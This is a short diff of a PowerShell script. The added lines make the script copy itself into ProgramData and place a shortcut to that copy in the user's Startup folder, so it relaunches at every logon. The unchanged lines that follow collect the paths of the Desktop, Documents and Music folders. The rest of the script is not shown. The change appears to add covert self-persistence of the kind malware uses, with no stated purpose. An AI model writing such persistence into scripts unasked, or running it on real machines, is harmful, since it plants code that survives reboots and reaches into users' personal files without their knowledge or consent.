@@ -1,3 +1,17 @@
+$scriptPath = $MyInvocation.MyCommand.Path
+
+# Copy the script to a permanent location
+$destinationPath = Join-Path -Path $env:ProgramData -ChildPath "MyScript.ps1"
+Copy-Item -Path $scriptPath -Destination $destinationPath -Force
+
+# Create a shortcut to the script
+$shortcutPath = Join-Path -Path $env:AppData -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\MyScript.lnk"
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $destinationPath
+$shortcut.Save()
+
+# Rest of the script...
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $musicPath = [Environment]::GetFolderPath("MyMusic")
